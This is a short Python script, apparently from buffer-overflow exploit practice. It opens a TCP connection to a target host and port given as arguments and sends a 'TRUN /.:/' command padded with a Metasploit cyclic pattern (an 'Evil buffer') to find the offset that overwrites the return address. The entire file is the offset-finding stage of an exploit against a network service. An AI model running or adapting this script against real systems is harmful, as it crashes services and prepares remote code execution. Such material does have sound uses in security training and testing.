#!/usr/bin/python3

import sys, socket
from time import sleep

offset = "" # create with metasploit /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <lenght>
ip = sys.argv[1]
port = int(sys.argv[2])

try:
	print("PYTHON OFFSET FINDER\n")
	print("Sending Evil buffer...")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	payload = "TRUN /.:/" + offset  # change for different CMD
	s.send((payload.encode()))
	s.recv(1024)
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
